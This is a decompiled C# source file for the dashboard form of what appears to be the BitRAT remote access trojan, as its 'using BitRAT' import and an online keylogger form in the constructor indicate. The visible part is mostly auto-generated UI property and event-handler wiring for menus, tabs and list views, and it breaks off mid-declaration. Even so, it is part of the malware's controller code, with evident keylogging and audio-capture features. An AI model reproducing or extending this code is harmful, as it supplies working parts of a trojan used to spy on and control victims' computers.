﻿using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NAudio.Lame;
using NAudio.Wave;
using Newtonsoft.Json.Linq;
using VisualPlus.Toolkit.Controls.Interactivity;
using VisualPlus.Toolkit.Controls.Layout;
using Zeroit.Framework.Progress;

// Token: 0x020000A8 RID: 168
[DesignerGenerated]
public sealed partial class fDashboard : Form
{
	// Token: 0x0600051A RID: 1306 RVA: 0x00023948 File Offset: 0x00021B48
	public fDashboard()
	{
		base.Load += this.fDashboard_Load;
		base.Resize += this.fDashboard_Resize;
		base.FormClosing += this.fDashboard_FormClosing;
		base.Activated += this.fDashboard_Activated;
		base.KeyPress += this.fDashboard_KeyPress;
		base.KeyDown += this.fDashboard_KeyDown;
		this.string_7 = string.Empty;
		this.collection_0 = new Collection();
		this.string_8 = string.Empty;
		this.collection_1 = new Collection();
		this.concurrentStack_0 = new ConcurrentStack<Class130.Struct19>();
		this.stringBuilder_0 = new StringBuilder();
		this.string_10 = string.Empty;
		this.string_11 = string.Empty;
		this.fKeylogOnline_0 = new fKeylogOnline();
		this.concurrentStack_1 = new ConcurrentStack<RawSourceWaveStream>();
		this.concurrentStack_2 = new ConcurrentStack<WaveFormat>();
		this.int_5 = -1;
		this.InitializeComponent();
	}

	// Token: 0x0600051D RID: 1309 RVA: 0x0000528A File Offset: 0x0000348A
	internal MenuStrip vmethod_0()
	{
		return this.menuStrip_0;
	}

	// Token: 0x0600051E RID: 1310 RVA: 0x00035E44 File Offset: 0x00034044
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(MenuStrip menuStrip_1)
	{
		ToolStripItemClickedEventHandler value = new ToolStripItemClickedEventHandler(this.method_247);
		MenuStrip menuStrip = this.menuStrip_0;
		if (menuStrip != null)
		{
			menuStrip.ItemClicked -= value;
		}
		this.menuStrip_0 = menuStrip_1;
		menuStrip = this.menuStrip_0;
		if (menuStrip != null)
		{
			menuStrip.ItemClicked += value;
		}
	}

	// Token: 0x0600051F RID: 1311 RVA: 0x00005292 File Offset: 0x00003492
	internal ToolStripMenuItem vmethod_2()
	{
		return this.toolStripMenuItem_0;
	}

	// Token: 0x06000520 RID: 1312 RVA: 0x0000529A File Offset: 0x0000349A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_0 = toolStripMenuItem_136;
	}

	// Token: 0x06000521 RID: 1313 RVA: 0x000052A3 File Offset: 0x000034A3
	internal ToolStripMenuItem vmethod_4()
	{
		return this.toolStripMenuItem_1;
	}

	// Token: 0x06000522 RID: 1314 RVA: 0x00035E88 File Offset: 0x00034088
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_27);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_1;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_1 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_1;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000523 RID: 1315 RVA: 0x000052AB File Offset: 0x000034AB
	internal ContextMenuStrip vmethod_6()
	{
		return this.contextMenuStrip_0;
	}

	// Token: 0x06000524 RID: 1316 RVA: 0x000052B3 File Offset: 0x000034B3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_0 = contextMenuStrip_14;
	}

	// Token: 0x06000525 RID: 1317 RVA: 0x000052BC File Offset: 0x000034BC
	internal ToolStripMenuItem vmethod_8()
	{
		return this.toolStripMenuItem_2;
	}

	// Token: 0x06000526 RID: 1318 RVA: 0x00035ECC File Offset: 0x000340CC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_20);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_2 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000527 RID: 1319 RVA: 0x000052C4 File Offset: 0x000034C4
	internal ToolStripSeparator vmethod_10()
	{
		return this.toolStripSeparator_0;
	}

	// Token: 0x06000528 RID: 1320 RVA: 0x000052CC File Offset: 0x000034CC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_0 = toolStripSeparator_39;
	}

	// Token: 0x06000529 RID: 1321 RVA: 0x000052D5 File Offset: 0x000034D5
	internal ToolStripMenuItem vmethod_12()
	{
		return this.toolStripMenuItem_3;
	}

	// Token: 0x0600052A RID: 1322 RVA: 0x00035F10 File Offset: 0x00034110
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_21);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_3 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600052B RID: 1323 RVA: 0x000052DD File Offset: 0x000034DD
	internal ToolStripMenuItem vmethod_14()
	{
		return this.toolStripMenuItem_4;
	}

	// Token: 0x0600052C RID: 1324 RVA: 0x000052E5 File Offset: 0x000034E5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_4 = toolStripMenuItem_136;
	}

	// Token: 0x0600052D RID: 1325 RVA: 0x000052EE File Offset: 0x000034EE
	internal ToolStripMenuItem vmethod_16()
	{
		return this.toolStripMenuItem_5;
	}

	// Token: 0x0600052E RID: 1326 RVA: 0x00035F54 File Offset: 0x00034154
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_26);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_5;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_5 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_5;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600052F RID: 1327 RVA: 0x000052F6 File Offset: 0x000034F6
	internal TabControl vmethod_18()
	{
		return this.tabControl_0;
	}

	// Token: 0x06000530 RID: 1328 RVA: 0x000052FE File Offset: 0x000034FE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(TabControl tabControl_1)
	{
		this.tabControl_0 = tabControl_1;
	}

	// Token: 0x06000531 RID: 1329 RVA: 0x00005307 File Offset: 0x00003507
	internal TabPage vmethod_20()
	{
		return this.tabPage_0;
	}

	// Token: 0x06000532 RID: 1330 RVA: 0x0000530F File Offset: 0x0000350F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(TabPage tabPage_17)
	{
		this.tabPage_0 = tabPage_17;
	}

	// Token: 0x06000533 RID: 1331 RVA: 0x00005318 File Offset: 0x00003518
	internal TabPage vmethod_22()
	{
		return this.tabPage_1;
	}

	// Token: 0x06000534 RID: 1332 RVA: 0x00005320 File Offset: 0x00003520
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(TabPage tabPage_17)
	{
		this.tabPage_1 = tabPage_17;
	}

	// Token: 0x06000535 RID: 1333 RVA: 0x00005329 File Offset: 0x00003529
	internal PictureBox vmethod_24()
	{
		return this.pictureBox_0;
	}

	// Token: 0x06000536 RID: 1334 RVA: 0x00035F98 File Offset: 0x00034198
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(PictureBox pictureBox_7)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_111);
		MouseEventHandler value2 = new MouseEventHandler(this.method_113);
		MouseEventHandler value3 = new MouseEventHandler(this.method_114);
		MouseEventHandler value4 = new MouseEventHandler(this.method_115);
		PictureBox pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.MouseDown -= value;
			pictureBox.MouseUp -= value2;
			pictureBox.MouseMove -= value3;
			pictureBox.MouseWheel -= value4;
		}
		this.pictureBox_0 = pictureBox_7;
		pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.MouseDown += value;
			pictureBox.MouseUp += value2;
			pictureBox.MouseMove += value3;
			pictureBox.MouseWheel += value4;
		}
	}

	// Token: 0x06000537 RID: 1335 RVA: 0x00005331 File Offset: 0x00003531
	internal Label vmethod_26()
	{
		return this.label_0;
	}

	// Token: 0x06000538 RID: 1336 RVA: 0x00005339 File Offset: 0x00003539
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(Label label_30)
	{
		this.label_0 = label_30;
	}

	// Token: 0x06000539 RID: 1337 RVA: 0x00005342 File Offset: 0x00003542
	internal ToolStripMenuItem vmethod_28()
	{
		return this.toolStripMenuItem_6;
	}

	// Token: 0x0600053A RID: 1338 RVA: 0x0000534A File Offset: 0x0000354A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_6 = toolStripMenuItem_136;
	}

	// Token: 0x0600053B RID: 1339 RVA: 0x00005353 File Offset: 0x00003553
	internal ToolStripMenuItem vmethod_30()
	{
		return this.toolStripMenuItem_7;
	}

	// Token: 0x0600053C RID: 1340 RVA: 0x00036030 File Offset: 0x00034230
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_28);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_7;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_7 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_7;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600053D RID: 1341 RVA: 0x0000535B File Offset: 0x0000355B
	internal TabPage vmethod_32()
	{
		return this.tabPage_2;
	}

	// Token: 0x0600053E RID: 1342 RVA: 0x00005363 File Offset: 0x00003563
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(TabPage tabPage_17)
	{
		this.tabPage_2 = tabPage_17;
	}

	// Token: 0x0600053F RID: 1343 RVA: 0x0000536C File Offset: 0x0000356C
	internal ContextMenuStrip vmethod_34()
	{
		return this.contextMenuStrip_1;
	}

	// Token: 0x06000540 RID: 1344 RVA: 0x00005374 File Offset: 0x00003574
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_1 = contextMenuStrip_14;
	}

	// Token: 0x06000541 RID: 1345 RVA: 0x0000537D File Offset: 0x0000357D
	internal ToolStripMenuItem vmethod_36()
	{
		return this.toolStripMenuItem_8;
	}

	// Token: 0x06000542 RID: 1346 RVA: 0x00036074 File Offset: 0x00034274
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_29);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_8;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_8 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_8;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000543 RID: 1347 RVA: 0x00005385 File Offset: 0x00003585
	internal ToolStripSeparator vmethod_38()
	{
		return this.toolStripSeparator_1;
	}

	// Token: 0x06000544 RID: 1348 RVA: 0x0000538D File Offset: 0x0000358D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_1 = toolStripSeparator_39;
	}

	// Token: 0x06000545 RID: 1349 RVA: 0x00005396 File Offset: 0x00003596
	internal ToolStripMenuItem vmethod_40()
	{
		return this.toolStripMenuItem_9;
	}

	// Token: 0x06000546 RID: 1350 RVA: 0x000360B8 File Offset: 0x000342B8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_41(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_30);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_9;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_9 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_9;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000547 RID: 1351 RVA: 0x0000539E File Offset: 0x0000359E
	internal ToolStripMenuItem vmethod_42()
	{
		return this.toolStripMenuItem_10;
	}

	// Token: 0x06000548 RID: 1352 RVA: 0x000360FC File Offset: 0x000342FC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_43(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_32);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_10;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_10 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_10;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000549 RID: 1353 RVA: 0x000053A6 File Offset: 0x000035A6
	internal ToolStripSeparator vmethod_44()
	{
		return this.toolStripSeparator_2;
	}

	// Token: 0x0600054A RID: 1354 RVA: 0x000053AE File Offset: 0x000035AE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_45(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_2 = toolStripSeparator_39;
	}

	// Token: 0x0600054B RID: 1355 RVA: 0x000053B7 File Offset: 0x000035B7
	internal ToolStripMenuItem vmethod_46()
	{
		return this.toolStripMenuItem_11;
	}

	// Token: 0x0600054C RID: 1356 RVA: 0x00036140 File Offset: 0x00034340
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_47(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_31);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_11;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_11 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_11;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600054D RID: 1357 RVA: 0x000053BF File Offset: 0x000035BF
	internal ToolStripMenuItem vmethod_48()
	{
		return this.toolStripMenuItem_12;
	}

	// Token: 0x0600054E RID: 1358 RVA: 0x000053C7 File Offset: 0x000035C7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_49(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_12 = toolStripMenuItem_136;
	}

	// Token: 0x0600054F RID: 1359 RVA: 0x000053D0 File Offset: 0x000035D0
	internal ToolStripMenuItem vmethod_50()
	{
		return this.toolStripMenuItem_13;
	}

	// Token: 0x06000550 RID: 1360 RVA: 0x000053D8 File Offset: 0x000035D8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_51(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_13 = toolStripMenuItem_136;
	}

	// Token: 0x06000551 RID: 1361 RVA: 0x000053E1 File Offset: 0x000035E1
	internal ToolStripMenuItem vmethod_52()
	{
		return this.toolStripMenuItem_14;
	}

	// Token: 0x06000552 RID: 1362 RVA: 0x00036184 File Offset: 0x00034384
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_53(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_33);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_14;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_14 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_14;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000553 RID: 1363 RVA: 0x000053E9 File Offset: 0x000035E9
	internal ToolStripMenuItem vmethod_54()
	{
		return this.toolStripMenuItem_15;
	}

	// Token: 0x06000554 RID: 1364 RVA: 0x000361C8 File Offset: 0x000343C8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_55(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_34);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_15;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_15 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_15;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000555 RID: 1365 RVA: 0x000053F1 File Offset: 0x000035F1
	internal ToolStripMenuItem vmethod_56()
	{
		return this.toolStripMenuItem_16;
	}

	// Token: 0x06000556 RID: 1366 RVA: 0x0003620C File Offset: 0x0003440C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_57(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_35);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_16;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_16 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_16;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000557 RID: 1367 RVA: 0x000053F9 File Offset: 0x000035F9
	internal ToolStripMenuItem vmethod_58()
	{
		return this.toolStripMenuItem_17;
	}

	// Token: 0x06000558 RID: 1368 RVA: 0x00036250 File Offset: 0x00034450
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_59(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_36);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_17;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_17 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_17;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000559 RID: 1369 RVA: 0x00005401 File Offset: 0x00003601
	internal ToolStripMenuItem vmethod_60()
	{
		return this.toolStripMenuItem_18;
	}

	// Token: 0x0600055A RID: 1370 RVA: 0x00036294 File Offset: 0x00034494
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_61(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_37);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_18;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_18 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_18;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600055B RID: 1371 RVA: 0x00005409 File Offset: 0x00003609
	internal ToolStripMenuItem vmethod_62()
	{
		return this.toolStripMenuItem_19;
	}

	// Token: 0x0600055C RID: 1372 RVA: 0x000362D8 File Offset: 0x000344D8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_63(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_38);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_19;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_19 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_19;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600055D RID: 1373 RVA: 0x00005411 File Offset: 0x00003611
	internal ToolStripSeparator vmethod_64()
	{
		return this.toolStripSeparator_3;
	}

	// Token: 0x0600055E RID: 1374 RVA: 0x00005419 File Offset: 0x00003619
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_65(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_3 = toolStripSeparator_39;
	}

	// Token: 0x0600055F RID: 1375 RVA: 0x00005422 File Offset: 0x00003622
	internal ToolStripSeparator vmethod_66()
	{
		return this.toolStripSeparator_4;
	}

	// Token: 0x06000560 RID: 1376 RVA: 0x0000542A File Offset: 0x0000362A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_67(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_4 = toolStripSeparator_39;
	}

	// Token: 0x06000561 RID: 1377 RVA: 0x00005433 File Offset: 0x00003633
	internal ToolStripMenuItem vmethod_68()
	{
		return this.toolStripMenuItem_20;
	}

	// Token: 0x06000562 RID: 1378 RVA: 0x0003631C File Offset: 0x0003451C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_69(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_39);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_20;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_20 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_20;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000563 RID: 1379 RVA: 0x0000543B File Offset: 0x0000363B
	internal TabPage vmethod_70()
	{
		return this.tabPage_3;
	}

	// Token: 0x06000564 RID: 1380 RVA: 0x00005443 File Offset: 0x00003643
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_71(TabPage tabPage_17)
	{
		this.tabPage_3 = tabPage_17;
	}

	// Token: 0x06000565 RID: 1381 RVA: 0x0000544C File Offset: 0x0000364C
	internal ContextMenuStrip vmethod_72()
	{
		return this.contextMenuStrip_2;
	}

	// Token: 0x06000566 RID: 1382 RVA: 0x00005454 File Offset: 0x00003654
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_73(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_2 = contextMenuStrip_14;
	}

	// Token: 0x06000567 RID: 1383 RVA: 0x0000545D File Offset: 0x0000365D
	internal ToolStripMenuItem vmethod_74()
	{
		return this.toolStripMenuItem_21;
	}

	// Token: 0x06000568 RID: 1384 RVA: 0x00036360 File Offset: 0x00034560
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_75(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_29);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_21;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_21 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_21;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000569 RID: 1385 RVA: 0x00005465 File Offset: 0x00003665
	internal GClass7 vmethod_76()
	{
		return this.gclass7_0;
	}

	// Token: 0x0600056A RID: 1386 RVA: 0x000363A4 File Offset: 0x000345A4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_77(GClass7 gclass7_13)
	{
		ListViewItemSelectionChangedEventHandler value = new ListViewItemSelectionChangedEventHandler(this.method_69);
		EventHandler value2 = new EventHandler(this.method_127);
		KeyEventHandler value3 = new KeyEventHandler(this.method_138);
		EventHandler value4 = new EventHandler(this.method_266);
		EventHandler value5 = new EventHandler(this.method_295);
		GClass7 gclass = this.gclass7_0;
		if (gclass != null)
		{
			gclass.ItemSelectionChanged -= value;
			gclass.SelectedIndexChanged -= value2;
			gclass.KeyDown -= value3;
			gclass.LostFocus -= value4;
			gclass.DoubleClick -= value5;
		}
		this.gclass7_0 = gclass7_13;
		gclass = this.gclass7_0;
		if (gclass != null)
		{
			gclass.ItemSelectionChanged += value;
			gclass.SelectedIndexChanged += value2;
			gclass.KeyDown += value3;
			gclass.LostFocus += value4;
			gclass.DoubleClick += value5;
		}
	}

	// Token: 0x0600056B RID: 1387 RVA: 0x0000546D File Offset: 0x0000366D
	internal GClass7 vmethod_78()
	{
		return this.gclass7_1;
	}

	// Token: 0x0600056C RID: 1388 RVA: 0x0003645C File Offset: 0x0003465C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_79(GClass7 gclass7_13)
	{
		KeyEventHandler value = new KeyEventHandler(this.method_133);
		MouseEventHandler value2 = new MouseEventHandler(this.method_224);
		ColumnClickEventHandler value3 = new ColumnClickEventHandler(this.method_243);
		GClass7 gclass = this.gclass7_1;
		if (gclass != null)
		{
			gclass.KeyDown -= value;
			gclass.MouseUp -= value2;
			gclass.ColumnClick -= value3;
		}
		this.gclass7_1 = gclass7_13;
		gclass = this.gclass7_1;
		if (gclass != null)
		{
			gclass.KeyDown += value;
			gclass.MouseUp += value2;
			gclass.ColumnClick += value3;
		}
	}

	// Token: 0x0600056D RID: 1389 RVA: 0x00005475 File Offset: 0x00003675
	internal Label vmethod_80()
	{
		return this.label_1;
	}

	// Token: 0x0600056E RID: 1390 RVA: 0x0000547D File Offset: 0x0000367D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_81(Label label_30)
	{
		this.label_1 = label_30;
	}

	// Token: 0x0600056F RID: 1391 RVA: 0x00005486 File Offset: 0x00003686
	internal ComboBox vmethod_82()
	{
		return this.comboBox_0;
	}

	// Token: 0x06000570 RID: 1392 RVA: 0x000364D8 File Offset: 0x000346D8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_83(ComboBox comboBox_9)
	{
		EventHandler value = new EventHandler(this.method_74);
		KeyEventHandler value2 = new KeyEventHandler(this.method_170);
		ComboBox comboBox = this.comboBox_0;
		if (comboBox != null)
		{
			comboBox.SelectedIndexChanged -= value;
			comboBox.KeyDown -= value2;
		}
		this.comboBox_0 = comboBox_9;
		comboBox = this.comboBox_0;
		if (comboBox != null)
		{
			comboBox.SelectedIndexChanged += value;
			comboBox.KeyDown += value2;
		}
	}

	// Token: 0x06000571 RID: 1393 RVA: 0x0000548E File Offset: 0x0000368E
	internal Label vmethod_84()
	{
		return this.label_2;
	}

	// Token: 0x06000572 RID: 1394 RVA: 0x00005496 File Offset: 0x00003696
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_85(Label label_30)
	{
		this.label_2 = label_30;
	}

	// Token: 0x06000573 RID: 1395 RVA: 0x0000549F File Offset: 0x0000369F
	internal VisualButton vmethod_86()
	{
		return this.visualButton_0;
	}

	// Token: 0x06000574 RID: 1396 RVA: 0x00036538 File Offset: 0x00034738
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_87(VisualButton visualButton_24)
	{
		EventHandler value = new EventHandler(this.method_72);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_24;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000575 RID: 1397 RVA: 0x000054A7 File Offset: 0x000036A7
	internal ComboBox vmethod_88()
	{
		return this.comboBox_1;
	}

	// Token: 0x06000576 RID: 1398 RVA: 0x0003657C File Offset: 0x0003477C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_89(ComboBox comboBox_9)
	{
		EventHandler value = new EventHandler(this.method_78);
		ComboBox comboBox = this.comboBox_1;
		if (comboBox != null)
		{
			comboBox.SelectedIndexChanged -= value;
		}
		this.comboBox_1 = comboBox_9;
		comboBox = this.comboBox_1;
		if (comboBox != null)
		{
			comboBox.SelectedIndexChanged += value;
		}
	}

	// Token: 0x06000577 RID: 1399 RVA: 0x000054AF File Offset: 0x000036AF
	internal Label vmethod_90()
	{
		return this.label_3;
	}

	// Token: 0x06000578 RID: 1400 RVA: 0x000054B7 File Offset: 0x000036B7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_91(Label label_30)
	{
		this.label_3 = label_30;
	}

	// Token: 0x06000579 RID: 1401 RVA: 0x000054C0 File Offset: 0x000036C0
